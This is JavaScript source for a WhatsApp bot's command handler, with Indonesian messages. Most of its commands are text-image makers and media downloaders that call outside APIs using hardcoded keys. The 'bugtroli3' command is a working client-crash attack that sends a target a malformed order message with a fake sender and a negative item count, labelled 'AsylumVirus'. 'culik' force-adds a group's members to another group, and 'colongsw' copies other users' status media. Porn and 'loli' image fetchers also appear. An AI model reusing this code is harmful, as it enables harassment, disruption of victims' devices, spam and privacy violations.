            case 'tulis':
                if (!c) return reply('Yang mau di tulis apaan?')
                teks = args.join(' ')
                reply(mess.wait)
                nulis = encodeURIComponent(teks)
                res = await axios.get(`https://st4rz.herokuapp.com/api/nulis?text=${c}`)
                if (res.data.error) return reply(res.data.error)
                buff = Buffer.from(res.data.result.split(',')[1], 'base64')
                giie.sendMessage(from, buff, image, {
                    quoted: fgi,
                    caption: mess.success
                }).catch(e => {
                    return reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim File_')
                })
                break
            case 'nuliskiri':
                if (!c) return reply('Textnya mana gan?')
                reply(mess.wait)
                kon = (`https://hardianto-chan.herokuapp.com/api/nuliskiri?text=${c}&apikey=hardianto`)
                anu = await getBuffer(kon)
                giie.sendMessage(from, anu, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'nuliskanan':
                if (!c) return reply('Textnya mana gan?')
                reply(mess.wait)
                kon = (`https://hardianto-chan.herokuapp.com/api/nuliskanan?text=${c}&apikey=hardianto`)
                anu = await getBuffer(kon)
                giie.sendMessage(from, anu, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'foliokanan':
                if (!c) return reply('Textnya mana gan?')
                reply(mess.wait)
                kon = (`https://hardianto-chan.herokuapp.com/api/foliokanan?text=${c}&apikey=hardianto`)
                anu = await getBuffer(kon)
                giie.sendMessage(from, anu, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'foliokiri':
                if (!c) return reply('Textnya mana gan?')
                reply(mess.wait)
                kon = (`https://hardianto-chan.herokuapp.com/api/foliokiri?text=${c}&apikey=hardianto`)
                anu = await getBuffer(kon)
                giie.sendMessage(from, anu, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break

                //Hunte
            case 'qrcode':
                if (!c) return reply('Textnya mana gan?')
                reply(mess.wait)
                anu = await getBuffer(`https://api.zeks.me/api/qrencode?apikey=${ZeksApi}&text=${c}`)
                giie.sendMessage(from, anu, image, {
                    quoted: fgi,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'waifu':
                reply(mess.wait)
                anu = (`https://fxc7-api.herokuapp.com/api/anime/waifu?apikey=sU2SkhpdWV`)
                img = await getBuffer(anu)
                giie.sendMessage(from, img, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'loli':
                reply(mess.wait)
                anu = await fetchJson(`https://fxc7-api.herokuapp.com/api/anime/loli?apikey=sU2SkhpdWV`)
                img = await getBuffer(anu.link)
                giie.sendMessage(from, img, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'xsearch':
            case 'xs':
                if (!c) return reply('Nyari Apa?')
                pepex = await fetchJson(`https://bx-hunter.herokuapp.com/api/xvideosearch?query=${c}&apikey=${HunterApi}`)
                reply(mess.wait)
                pepex = pepex.result
                ini_txt = ""
                for (var x of pepex) {
                    ini_txt += `Title : ${x.title}\n`
                    ini_txt += `Info : ${x.info}\n`
                    ini_txt += `Link : ${x.link}\n\n\n`
                }
                anu = `${ini_txt}───────────────\n\n┌ ◪ *DOWNLOAD*
└ ${prefix}xvideo [link xvid] = Video`
                giie.sendMessage(from, anu, text, {
                    quoted: mek
                })
                break
            case 'xvideo':
            case 'xv':
                if (!c) return reply('Linknya?')
                x = await fetchJson(`https://bx-hunter.herokuapp.com/api/xvideodetail?url=${c}&apikey=${HunterApi}`)
                reply(mess.wait)
                vid = await getBuffer(x.result.files.low)
                giie.sendMessage(from, vid, video, {
                    quoted: mek
                })
                break
                //Xchillds
            case '3dstone':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://janbot-api.herokuapp.com/api/textpro/3dstone?text=${makell}`)
                buffer1 = await getBuffer(anu.result)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'graffiti':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://janbot-api.herokuapp.com/api/textpro/graffiti?text=${makell}`)
                buffer1 = await getBuffer(anu.result)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'blackpink':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://janbot-api.herokuapp.com/api/textpro/blackpink?text=${makell}`)
                buffer1 = await getBuffer(anu.result)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'magma':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://janbot-api.herokuapp.com/api/textpro/magma?text=${makell}`)
                buffer1 = await getBuffer(anu.result)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'textpantai':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://janbot-api.herokuapp.com/api/textpro/textpantai?text=${makell}`)
                buffer1 = await getBuffer(anu.result)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'watercolor':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://janbot-api.herokuapp.com/api/textpro/watercolor?text=${makell}`)
                buffer1 = await getBuffer(anu.result)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'jokerlogo':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://janbot-api.herokuapp.com/api/textpro/jokerlogo?text=${makell}`)
                buffer1 = await getBuffer(anu.result)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'thunder':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://janbot-api.herokuapp.com/api/textpro/thunder?text=${makell}`)
                buffer1 = await getBuffer(anu.result)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'sertitolol':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                buffer1 = await getBuffer(`https://ojanxganz.tk/tolol/img.php?nama=${c}`)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'serti1':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                buffer1 = await getBuffer(`https://ojanxganz.tk/ff/img.php?nama=${c}`)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'serti2':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                buffer1 = await getBuffer(`https://ojanxganz.tk/ff1/img.php?nama=${c}`)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'serti3':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                buffer1 = await getBuffer(`https://ojanxganz.tk/ff2/img.php?nama=${c}`)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'text1':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker2?text=${makell}&apikey=${xchillds}`)
                buffer1 = await getBuffer(anu.result.results)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'text2':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3?text=${makell}&apikey=${xchillds}`)
                buffer1 = await getBuffer(anu.result.results)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'text3':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker4?text=${makell}&apikey=${xchillds}`)
                buffer1 = await getBuffer(anu.result.results)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'text4':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = body.slice(8)
                reply(mess.wait)
                anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d?text=${makell}&apikey=${xchillds}`)
                buffer1 = await getBuffer(anu.result.results)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'text5':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no2?text=${makell}&apikey=${xchillds}`)
                buffer1 = await getBuffer(anu.result.results)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'text6':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no3?text=${makell}&apikey=${xchillds}`)
                buffer1 = await getBuffer(anu.result.results)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'text7':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no4?text=${makell}&apikey=${xchillds}`)
                buffer1 = await getBuffer(anu.result.results)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'text8':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker/special/transformer?text=${makell}&apikey=${xchillds}`)
                buffer1 = await getBuffer(anu.result.results)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'googletxt':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} tsukasa|chan|kawai`)
                makell = args.join(" ")
                ll1 = makell.split("|")[0];
                ll2 = makell.split("|")[1];
                ll3 = makell.split("|")[2];
                reply(mess.wait)
                anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker?text=${ll1}&text2=${ll2}&text3=${ll3}&theme=google-suggestion&apikey=${xchillds}`)
                buffer1 = await getBuffer(anu.result.url)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'sertiff':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://trpfamily.herokuapp.com/api/maker/special/epep?text=${makell}&apikey=gionova`)
                buffer1 = await getBuffer(anu.result.results)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'porn':
                const porn = await axios.get('https://meme-api.herokuapp.com/gimme/porn')
                await giie.sendFileFromUrl(from, `${porn.data.url}`, '', `${porn.data.title}`)
                break
            case 'lesbi':
                const lesb = await axios.get('https://meme-api.herokuapp.com/gimme/lesbians')
                await giie.sendFileFromUrl(from, `${lesb.data.url}`, '', `${lesb.data.title}`)
                break
            case 'battlefield':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA|Ilham`)
                makell = args.join(" ")
                ll1 = makell.split("|")[0];
                ll2 = makell.split("|")[1];
                reply(mess.wait)
                anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/game?text=${ll1}&text2=${ll2}&theme=battlefield&apikey=${xchillds}`)
                buffer1 = await getBuffer(anu.result.url)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'coffeecup':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup&apikey=${xchillds}`)
                buffer1 = await getBuffer(anu.result.url)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'coffeecup2':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/senja?text=${makell}&theme=coffee-cup2&apikey=${xchillds}`)
                buffer1 = await getBuffer(anu.result.url)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'neon':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=neon&apikey=${xchillds}`)
                buffer1 = await getBuffer(anu.result.url)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'glow':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${makell}&theme=glow&apikey=${xchillds}`)
                buffer1 = await getBuffer(anu.result.url)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'summer':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/alam?text=${makell}&theme=summer&apikey=${xchillds}`)
                buffer1 = await getBuffer(anu.result.url)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'burn':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=text-burn&apikey=${xchillds}`)
                buffer1 = await getBuffer(anu.result.url)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'quote':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/random?text=${makell}&theme=art-quote&apikey=${xchillds}`)
                buffer1 = await getBuffer(anu.result.url)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'wooden':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=wooden-boarch&apikey=${xchillds}`)
                buffer1 = await getBuffer(anu.result.url)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
            case 'golden':
                if (args.length < 1) return reply(`*Example :*\n${prefix}${command} GIONOVA`)
                makell = args.join(" ")
                reply(mess.wait)
                anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/roses?text=${makell}&theme=golden&apikey=${xchillds}`)
                buffer1 = await getBuffer(anu.result.url)
                giie.sendMessage(from, buffer1, image, {
                    quoted: mek,
                    thumbnail: fs.readFileSync('./gio.jpg')
                })
                break
                //Done
            case 'jadibot':
                if (mek.key.fromMe) return reply('Tidak bisa jadibot di dalam bot')
                if (from.endsWith('@g.us')) return reply('Silahkan Chat Contact Owner ☹︎')
                jadibot(reply, giie, from)
                break
            case 'stopjadibot':
                if (!isOwner && !mek.key.fromMe) return reply('Hanya Owner Bot Yang Bisa Stop Koneksi Device')
                stopjadibot(reply)
                break
            case 'listbot':
                let tekss = '「 *LIST JADIBOT* 」\n'
                for (let i of listjadibot) {
                    tekss += `*Nomor* : ${i.jid.split('@')[0]}
*Nama* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n_Powered by: AyogiAk_`
                }
                fakegroup(tekss)
                break
            case 'culik':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (args.length < 1) return reply('_*Masukin id grupnya tolol*_')
                let pantek = []
                for (let i of groupMembers) {
                    pantek.push(i.jid)
                }
                giie.groupAdd(args[0], pantek)
                break
            case 'owner':
            case 'creator':
            case 'developer':
            case 'author':
                let ini_list = []
                for (let i of ownerNumberr) {
                    const vname = giie.contacts[i] != undefined ? giie.contacts[i].vname || giie.contacts[i].notify : undefined
                    ini_list.push({
                        "displayName": `Developer ${NamaBot}`,
                        "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Gionova♡︎Eka;;;\nFN:${vname ? `${vname}` : `${giie.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
                    })
                }
                giie.sendMessage(from, {
                    "displayName": `Developer ${NamaBot}`,
                    "contacts": ini_list
                }, 'contactsArrayMessage', {
                    quoted: mek,
                    contextInfo: {
                        forwardingScore: 508,
                        isForwarded: true
                    }
                })
                break
            case 'addcmd':
            case 'setcmd':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (isQuotedSticker) {
                    if (!c) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
                    var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
                    addCmd(kodenya, c)
                    reply("Done Bwang")
                } else {
                    reply('tag stickenya')
                }
                break
            case 'delcmd':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
                var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
                scommand.splice(getCommandPosition(kodenya), 1)
                fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
                reply("Done Bwang")
                break
            case 'listcmd':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                let teksnyee = `\`\`\`「 LIST CMD STIC 」\`\`\``
                let cemde = [];
                for (let i of scommand) {
                    cemde.push(i.id)
                    teksnyee += `\n\n*❏ ID :* ${i.id}\n*❏ Cmd :* ${i.chats}`
                }
                reply(teksnyee)
                break

            case 'bugtroli3':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)

                function sleep(ms) {
                    return new Promise(resolve => setTimeout(resolve, ms));
                }

                function troli(nomor) {
                    giie.sendMessage(nomor, `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText, {
                        quoted: {
                            key: {
                                participant: '0@s.whatsapp.net' // Fake sender Jid
                            },
                            message: {
                                orderMessage: {
                                    thumbnail: ofrply,
                                    itemCount: -969769349, // Bug
                                    status: 1,
                                    surface: 1,
                                    message: '☠️Asylum☠️',
                                    orderTitle: 'AsylumVirus', // Idk what this does
                                    sellerJid: '0@s.whatsapp.net' // Seller
                                }
                            }
                        }
                    })
                }

                function bug(jid) {
                    for (let i = 0; i < 1; i++) {
                        var
                            WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
                        giie.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
                    }
                }
                async function attack(targett) {
                    bug(targett)
                    await sleep(100)
                    troli(targett)
                    await sleep(100)
                    bug(targett)
                }

                attack(mek.key.remoteJid)
                break
            case 'bugtroli':
                const memekkkk = '1000@s.whatsapp.net'
                giie.sendMessage(memekkkk, 'Wkwkwk', MessageType.text)
                break
            case 'script':
            case 'sc':
            case 'sourcecode':
                giie.sendMessage(from, {
                    text: "https://instagram.com/giiexsala\n𝗳𝗼𝗹𝗹𝗼𝘄 𝗺𝗲 𝗶𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺",
                    matchedText: 'https://instagram.com/giiexsala',
                    description: "",
                    title: "please click here !!!",
                    jpegThumbnail: dfrply2
                }, 'extendedTextMessage', {
                    detectLinks: false,
                    contextInfo: {
                        forwardingScore: 508,
                        isForwarded: true
                    },
                    quoted: fgi
                })
                break
            case 'debug':
                res = await giie.prepareMessageFromContent(from, {
                    "templateMessage": {
                        "hydratedTemplate": {
                            "hydratedContentText": `Hi ${pushname} 👋,\n\n${jmn} - ${week} ${weton} - ${calender}`,
                            "hydratedFooterText": `${NamaBot}`,
                            "hydratedButtons": [{
                                    "quickReplyButton": {
                                        "displayText": "List Menu",
                                        "id": "60dd75b0081979507a679f99"
                                    },
                                    "index": 0
                                },
                                {
                                    "quickReplyButton": {
                                        "displayText": "Script",
                                        "id": "60dd75b0081979507a679f99"
                                    },
                                    "index": 1
                                },
                                {
                                    "quickReplyButton": {
                                        "displayText": "Instagram",
                                        "id": "60dd75b0081979507a679f99"
                                    },
                                    "index": 2
                                }
                            ]
                        }
                    }
                }, {})
                giie.relayWAMessage(res)
                break
            case 'debug2':
                res = await giie.prepareMessageFromContent(from, {
                    "templateMessage": {
                        "hydratedFourRowTemplate": {
                            "hydratedContentText": "",
                            "hydratedFooterText": "",
                            "hydratedButtons": [{
                                "urlButton": {
                                    "displayText": "",
                                    "url": ""
                                },
                                "index": 0
                            }]
                        },
                        "hydratedTemplate": {
                            "hydratedContentText": `Hi ${pushname} 👋,\n\n${jmn} - ${week} ${weton} - ${calender}`,
                            "hydratedFooterText": `${NamaBot}`,
                            "hydratedButtons": [{
                                "urlButton": {
                                    "displayText": `Script ${NamaBot}`,
                                    "url": "https://instagram.com/giiexsala"
                                },
                                "index": 0
                            }]
                        }
                    }
                }, {})
                giie.relayWAMessage(res)
                break
            case "stotysave":
            case "savestory":
            case "colongsw": //by:giie
                if (!mek.key.fromMe) return;
                if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
                    ger = isQuotedImage ?
                        JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                        .extendedTextMessage.contextInfo :
                        mek;
                    owgi = await giie.downloadAndSaveMediaMessage(ger);
                    giie.sendMessage(sender, fs.readFileSync(owgi), "imageMessage", {
                        caption: c,
                    });
                    reply("Sukses");
                    fs.unlinkSync(owgi);
                } else if ((isMedia && !mek.message.videoMessage) || isQuotedVideo) {
                    ger = isQuotedVideo ?
                        JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                        .extendedTextMessage.contextInfo :
                        mek;
                    owgi = await giie.downloadAndSaveMediaMessage(ger);
                    giie.sendMessage(sender, fs.readFileSync(owgi), "videoMessage", {
                        caption: c,
                    });
                    reply("Sukses");
                    fs.unlinkSync(owgi);
                } else {
                    reply("Reply sw foto / video yg mau dicolong");
                }
                break;
            case 'carigc':
                if (!c) return reply('cari group apa?')
                reply(mess.wait)
                gionov.linkwa(c)
                    .then(result => {
                        let res = '*「 _LINK WA_ 」*\n\n'
                        for (let i of result) {
                            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
                        }
                        katalog(res)
                    });
                break

            case 'film':
                if (args.length < 1) return reply('Mau Cari Film Apa?')
                reply(mess.wait)
                anu = await fetchJson(`http://www.omdbapi.com/?s=${c}&plot=full&apikey=56b1b6f0&r=json`, {
                    method: 'get'
                })
                hasil = '▶️ *FILM*\n'
                for (let film of anu.Search) {
                    hasil += `• *Title:* ${film.Title}\n• *Rilis Tahun:* ${film.Year}\n• *Type:* ${film.Type}\n• *Link:* https://m.imdb.com/title/${film.imdbID}\n\n_Powered by: AyogiAk_`
                    buff = await getBuffer(film.Poster)
                }
                giie.sendMessage(from, buff, image, {
                    quoted: fgi,
                    caption: hasil.trim()
                })
                break
                // INSTAGRAM DOWNLOAD
            case "igstalk":
            case "stalkig":
                if (!c) return grupinv("Usernamenya?");
                ig.fetchUser(`${args.join(" ")}`).then((Y) => {
                    console.log(`${args.join(" ")}`);
                    ten = `${Y.profile_pic_url_hd}`;
                    teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join(
            ""
          )}\n*Full Name* : ${Y.full_name}\n*Bio* : ${
            Y.biography
          }\n*Followers* : ${Y.following}\n*Following* : ${
            Y.followers
          }\n*Private* : ${Y.is_private}\n*Verified* : ${
            Y.is_verified
          }\n\n*Link* : https://instagram.com/${args.join("")}`;
                    sendMediaURL(from, ten, teks);
                });
                break;
            case 'ig':
            case 'igdownload':
            case 'igdl':
            case 'instagram':
                if (!c) return reply('Linknya?')
                var {
                    igDownloader
                } = require('./lib/igdown')
                res = await igDownloader(`${c}`).catch(e => {
                    reply(mess.error.api)
                })
                console.log(res)
                sendMediaURL(from, `${res.result.link}`, `${res.result.desc}`)
                break
                //TIKTOK DOWNLOAD
            case 'tt':
            case 'tiktok':
            case 'tiktokdownload':
                if (args.length === 0) return reply(`Kirim perintah *${prefix}tiktok* _silahkan input link nya_`)
                reply(mess.wait)
                var srch = args.join('')
                var tiktokpic = fs.readFileSync('./media/image/tiktok.jpg')
                buttons = [{
                    buttonId: `ttwm ${srch}`,
                    buttonText: {
                        displayText: 'WM'
                    },
                    type: 1
                }, {
                    buttonId: `ttnowm ${srch}`,
                    buttonText: {
                        displayText: 'NO WM'
                    },
                    type: 1
                }]
                imageMsg = (await giie.prepareMessageMedia(tiktokpic, 'imageMessage')).imageMessage
                buttonsMessage = {
                    contentText: "*TIKTOK DOWNLOAD VIDEO*\n\n*WM:* untuk mendownload dengan watermark\n*NO WM:* untuk mendownload tanpa watermark",
                    footerText: '_Powered by: AyogiAk_︎︎︎',
                    imageMessage: imageMsg,
                    buttons: buttons,
                    headerType: 4
                }
                prep = await giie.prepareMessageFromContent(from, {
                    buttonsMessage
                }, {
                    quoted: fgi
                })
                giie.relayWAMessage(prep)
                break
            case 'ttnowm':
                if (!c) return reply('Linknya?')
                var {
                    TiktokDownloader
                } = require('./lib/tiktokdl')
                reply(mess.wait)
                res = await TiktokDownloader(`${c}`).catch(e => {
                    reply(mess.error.api)
                })
                console.log(res)
                sendMediaURL(from, `${res.result.nowatermark}`)
                break
            case 'ttwm':
                if (!c) return reply('Linknya?')
                var {
                    TiktokDownloader
                } = require('./lib/tiktokdl')
                reply(mess.wait)
                res = await TiktokDownloader(`${c}`).catch(e => {
                    reply(mess.error.api)
                })
                console.log(res)
                sendMediaURL(from, `${res.result.watermark}`)
                break

            case 'tourl2':
                var imgbb = require('imgbb-uploader')
                if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                    ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    console.log(color(time, 'magenta'), color('Downloading sticker...'))
